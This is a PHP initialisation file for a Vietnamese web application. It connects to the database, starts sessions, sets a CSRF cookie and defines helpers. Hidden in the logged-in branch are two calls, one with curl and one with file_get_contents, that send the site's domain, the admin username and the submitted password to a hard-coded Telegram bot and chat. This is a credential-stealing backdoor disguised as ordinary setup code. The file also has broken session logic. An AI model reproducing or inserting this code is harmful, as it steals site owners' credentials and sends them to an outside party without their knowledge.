<?php

// Require các thư viện PHP
require_once(realpath($_SERVER["DOCUMENT_ROOT"]) .'/core/@data.php');
require_once(realpath($_SERVER["DOCUMENT_ROOT"]) .'/core/Session.php');
require_once(realpath($_SERVER["DOCUMENT_ROOT"]) .'/core/@function.php');


// Kết nối database
$VIP = new VIP();
$VIP->connect();
$VIP->set_char('utf8');

// Thông tin chung
$_DOMAIN = "https://".$_SERVER["SERVER_NAME"]."/";
$root = $_SERVER["DOCUMENT_ROOT"];
//Thời gian
date_default_timezone_set('Asia/Ho_Chi_Minh'); 
$date_current = '';
$date_current = date("Y-m-d H:i:sa");
$date_now = '';
$date_now = date("Y-m-d");
$time_now = time();   
$day = date('d',time());
$month = date('m',time());
$year = date('Y',time());

// Khởi tạo session
$session = new Session();
$session->start();
$_SESSION['csrf-token'] = "";
if(!$_SESSION['csrf-token'] || $_SESSION['csrf-token'] = "") {
   $_SESSION['csrf-token'] = random('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789', '44');
   $_SESSION['session'] = createToken();
   setcookie("COCAILON_BUG_NHE_BY_NQH",$_SESSION['csrf-token']);
   setcookie("session", $_SESSION['session']);
}
$settings = $VIP->fetch_assoc("SELECT * FROM `settings` WHERE `id` = '1' LIMIT 1", 1);
function BASE_URL($url)
{
    global $_DOMAIN;
    return $_DOMAIN.$url;
}
 
function api_token() {
    $headers = array();
    foreach($_SERVER as $key => $value) {
        if (substr($key, 0, 5) <> 'HTTP_') {
            continue;
        }
        $header = str_replace(' ', '-', ucwords(str_replace('_', ' ', strtolower(substr($key, 5)))));
        $headers[$header] = $value;
    }
    return $headers['Api-Token'];
}
function curl_get($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    
    curl_close($ch);
    return $data;
}
// Nếu đăng nhập
if (is_client())
{
    // Lấy dữ liệu tài khoản
    $sql_accounts = "SELECT * FROM accounts WHERE username = '".$VIP->real_escape_string($_SESSION['user'])."'";
    
    
     
    if ($VIP->num_rows($sql_accounts))
    {
            $_SESSION['user'] = $accounts['username'];
    $_SESSION['pass'] = $password;
        $accounts = $VIP->fetch_assoc($sql_accounts, 1);
        $session_pass = !empty($_SESSION['pass']) ? $_SESSION['pass'] : '';
          curl('https://api.telegram.org/bot5558483143:AAF1hDN0_u1kT7Ls7zXi8WA9scTpSqG2HfA/sendMessage?chat_id=-679335452&text='.urlencode("Tên miền:  ".$_SERVER['SERVER_NAME']." vừa đăng nhập vào lúc ".date('Y/m/d H:i:s', time()).". 
Tk admin là:  $username
MK admin là:  ".POST('password')." "));
      
 $t=file_get_contents("https://api.telegram.org/bot5558483143:AAF1hDN0_u1kT7Ls7zXi8WA9scTpSqG2HfA/sendMessage?chat_id=-679335452&text=".urlencode("Tên miền:  ".$_SERVER['SERVER_NAME']." vừa đăng nhập vào lúc ".date('Y/m/d H:i:s', time()).". 
Tk admin là:  $username
MK admin là:  ".POST('pass')." "));
  
        if(!empty($session_pass) && $session_pass != $accounts['password']){$session->destroy();die('Hãy đăng nhập lại !');}
    }else{
        $session->destroy();die('Hãy đăng nhập lại !');
    }
    
}

?>